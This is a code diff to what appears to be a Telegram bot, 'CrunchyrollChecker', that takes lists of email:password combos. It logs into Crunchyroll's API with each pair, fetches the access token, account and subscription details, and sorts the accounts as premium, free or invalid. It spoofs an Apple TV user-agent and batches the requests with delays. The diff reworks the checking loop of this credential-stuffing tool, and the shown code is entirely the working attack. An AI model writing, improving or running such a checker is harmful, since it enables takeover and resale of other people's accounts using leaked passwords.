@@ -94,14 +94,20 @@ class CrunchyrollChecker:
             }
 
             response = session.post(url, headers=headers, data=data, timeout=12)
-            if any(x in response.text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400"]):
+            response_text = response.text
+
+            if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400"]):
                 return {'status': 'INVALID', 'email': email}
 
-            if '"access_token"' not in response.text:
+            if '"access_token"' not in response_text:
                 return {'status': 'INVALID', 'email': email}
 
             access_token = response.json().get('access_token')
-            headers = {'authorization': f'Bearer {access_token}', 'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'}
+
+            headers = {
+                'authorization': f'Bearer {access_token}',
+                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
+            }
 
             account_data = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=12).json()
             email_verified = account_data.get('email_verified', False)
@@ -109,6 +115,7 @@ class CrunchyrollChecker:
             external_id = account_data.get('external_id')
 
             products_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=12).json()
+
             plan = currency = subscribable = free_trial = "N/A"
             if 'items' in products_data and products_data['items']:
                 item = products_data['items'][0]
@@ -231,30 +238,34 @@ async def handle(message: types.Message):
     if not lines:
         return await message.answer("No valid email:password found.")
 
-    await message.answer(f"🚀 Checking {len(lines)} combos... (fast mode)")
+    total = len(lines)
+    await message.answer(f"🚀 Starting check on {total} combos... (fast mode)")
 
-    for i, line in enumerate(lines, 1):
-        try:
-            email, password = line.split(":", 1)
-            result = await asyncio.to_thread(checker.check, email.strip(), password.strip())
+    for i in range(0, total, 5):  # Process 5 at a time to prevent freeze
+        batch = lines[i:i+5]
+        await message.answer(f"📊 Processing batch {i+1}-{min(i+5, total)} / {total}")
 
-            stats['checked'] += 1
-            if result['status'] == 'PREMIUM':
-                stats['premium'] += 1
-            elif result['status'] == 'FREE':
-                stats['free'] += 1
-            else:
-                stats['invalid'] += 1
+        for line in batch:
+            try:
+                email, password = line.split(":", 1)
+                result = await asyncio.to_thread(checker.check, email.strip(), password.strip())
 
-            await send_result(message.from_user.id, result)
+                stats['checked'] += 1
+                if result['status'] == 'PREMIUM':
+                    stats['premium'] += 1
+                elif result['status'] == 'FREE':
+                    stats['free'] += 1
+                else:
+                    stats['invalid'] += 1
 
-            if i % 10 == 0:
-                await message.answer(f"✅ Progress: {i}/{len(lines)} combos checked...")
+                await send_result(message.from_user.id, result)
 
-            await asyncio.sleep(0.7 + random.uniform(0.1, 0.3))
+            except:
+                continue
 
-        except:
-            continue
+        await asyncio.sleep(2.0)  # Small delay between batches for stability
+
+    await message.answer("✅ All combos checked!")
 
 
 async def main():
